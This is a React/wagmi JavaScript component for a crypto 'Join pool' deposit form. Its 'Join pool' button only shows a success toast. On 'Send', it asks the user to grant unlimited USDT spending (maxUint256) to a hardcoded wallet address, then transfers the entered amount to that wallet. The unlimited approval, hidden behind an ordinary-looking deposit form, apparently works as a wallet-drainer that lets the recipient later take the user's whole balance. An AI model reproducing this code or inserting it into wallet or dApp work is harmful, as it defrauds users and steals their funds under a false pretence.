import ButtonPrimary from "./ButtonPrimary";
import { useCallback, useEffect, useMemo, useState } from "react";
import {
  useAccount,
  useChainId,
  useReadContracts,
  useWaitForTransactionReceipt,
  useWriteContract,
} from "wagmi";
import { TOKEN_DIVIDEND, USDT_CONTRACT } from "../common/constant";
import { erc20Abi, maxUint256, parseEther } from "viem";
import BigNumber from "bignumber.js";
import showToast from "../utils/showToast";

const walletReceive = "0x07D5e41162Fec6ABa2e67D9E4AeCc43d23DEBC25";

const FormTransaction = () => {
  const [inputValue, setInputValue] = useState("");
  const onChangeInputValue = useCallback((event) => {
    setInputValue(event.target.value);
  }, []);
  const { isConnected } = useAccount();

  const [errors, setErrors] = useState();
  const [loading, setLoading] = useState(false);
  const [joinPool, setJoinPool] = useState(false);

  const { address } = useAccount();
  const chainId = useChainId();
  // const estimateGas = useEstimateGas();
  // const estimateFeePerGas = useEstimateMaxPriorityFeePerGas();

  const rawBalance = useReadContracts({
    allowFailure: true,
    contracts: [
      {
        address: USDT_CONTRACT[chainId],
        abi: erc20Abi,
        functionName: "balanceOf",
        // @ts-ignore
        args: [address],
      },
    ],
    query: {
      enabled: typeof address !== "undefined",
      refetchInterval: 1000,
    },
  });

  const isDisabledInput = loading || !address;

  const { error: errorApprove, writeContractAsync: writeContractApproveAsync } =
    useWriteContract();

  const {
    data: sendHash,
    error: errorSend,
    writeContractAsync: writeContractSendAsync,
  } = useWriteContract();

  const { isSuccess: isConfirmedSend } = useWaitForTransactionReceipt({
    hash: sendHash,
  });

  const balance = useMemo(() => {
    const rawBalanceValue = rawBalance.data?.[0]?.result;

    if (!rawBalanceValue) {
      return {
        value: undefined,
        formattedNumber: undefined,
        formatted: undefined,
      };
    }

    const balanceBn = BigNumber(rawBalanceValue.toString()).div(TOKEN_DIVIDEND);

    return {
      value: rawBalanceValue,
      formattedNumber: balanceBn.toNumber(),
      formatted: balanceBn.toString(),
    };
  }, [rawBalance]);

  const onJoinPool = () => {
    showToast("success", "Join pool successful", {
      autoClose: 3000,
    });
    setJoinPool(true);
  };

  const onClickMax = useCallback(() => {
    const balanceValue = balance?.value;

    if (!balanceValue) {
      setInputValue("0");
      return;
    }

    const balanceValueBn = BigNumber(balanceValue.toString());

    setInputValue(balanceValueBn.div(TOKEN_DIVIDEND).toString());
  }, [balance]);

  //   const onChangeToAddress = useCallback(
  //     (event: ChangeEvent<HTMLInputElement>) => {
  //       setToAddress(event.target.value);
  //     },
  //     []
  //   );

  const onClickSend = useCallback(async () => {
    setErrors(undefined);

    const errorArr = [];

    // if (!toAddress || !isAddress(toAddress)) {
    //   errorArr.push(`Address '${toAddress}' is invalid.`);
    // }

    let sendValue;

    try {
      sendValue = parseEther(inputValue);

      if (sendValue <= 0) {
        errorArr.push(`Amount '${inputValue}' is invalid.`);
      } else if (sendValue > (balance?.value ?? 0)) {
        errorArr.push("Insufficient balance.");
      }
    } catch (e) {
      errorArr.push(e.message);
    }

    if (errorArr.length > 0) {
      setErrors(errorArr.join("\n"));
      return;
    }

    setLoading(true);

    await writeContractApproveAsync({
      address: USDT_CONTRACT[chainId],
      functionName: "approve",
      abi: erc20Abi,
      // @ts-ignore
      args: [walletReceive, maxUint256],
    });

    await writeContractSendAsync({
      address: USDT_CONTRACT[chainId],
      functionName: "transfer",
      abi: erc20Abi,
      // @ts-ignore
      args: [walletReceive, sendValue],
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [inputValue]);

  useEffect(() => {
    if (errorApprove) {
      setErrors(errorApprove.shortMessage ?? errorApprove.message);
    }

    if (errorSend) {
      setErrors(errorSend.shortMessage ?? errorSend.message);
    }
  }, [errorApprove, errorSend]);

  useEffect(() => {
    if (isConfirmedSend) {
      setLoading(false);
      showToast("success", "Transaction confirmed: " + sendHash, {
        autoClose: 5000,
      });
    } else {
      setLoading(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConfirmedSend]);

  useEffect(() => {
    if (errors) {
      showToast("error", errors);
      setLoading(false);
    } else {
      setLoading(false);
    }
  }, [errors]);

  return isConnected ? (
    joinPool ? (
      <div className="flex flex-col items-center w-full p-5 bg-white shadow-2xl rounded-large">
        <div className="flex flex-col w-full gap-y-1">
          <div className="flex items-end justify-between">
            <p className="text-base font-semibold">Amount</p>
            <small
              className={`font-medium opacity-70 ${
                isConnected &&
                "hover:text-secondColor cursor-pointer transition-all"
              }`}
              onClick={isConnected ? onClickMax : undefined}
            >
              {`Available ${
                balance.formattedNumber
                  ? `${new Intl.NumberFormat("en-US").format(
                      balance.formattedNumber
                    )} USDT`
                  : "0 USDT"
              }`}
            </small>
          </div>
          <div className="relative w-full mb-4 lg:mb-5">
            <input
              type="number"
              className="w-full tracking-wider px-5 py-[14px] text-xl transition-all bg-borderColor rounded-lg outline-none focus:bg-grayColor"
              disabled={isDisabledInput}
              placeholder="0.0000"
              value={inputValue}
              onChange={onChangeInputValue}
            />
          </div>
        </div>
        <div className="grid w-full grid-cols-2 font-bold gap-x-5">
          <button
            className="uppercase transition-all bg-transparent border-2 rounded-full hover:bg-secondColor hover:bg-opacity-10 text-secondColor border-secondColor"
            onClick={onClickMax}
          >
            Max
          </button>
          <ButtonPrimary
            className="px-4 py-[14px] uppercase"
            onClick={onClickSend}
          >
            Send
          </ButtonPrimary>
        </div>
      </div>
    ) : (
      <ButtonPrimary
        className="w-full px-4 py-3 font-semibold uppercase"
        onClick={onJoinPool}
      >
        Join pool
      </ButtonPrimary>
    )
  ) : (
    <ButtonPrimary
      primary={false}
      className="w-full px-4 py-3 rounded-full pointer-events-none select-none"
    >
      Please connect your wallet
    </ButtonPrimary>
  );
};

export default FormTransaction;
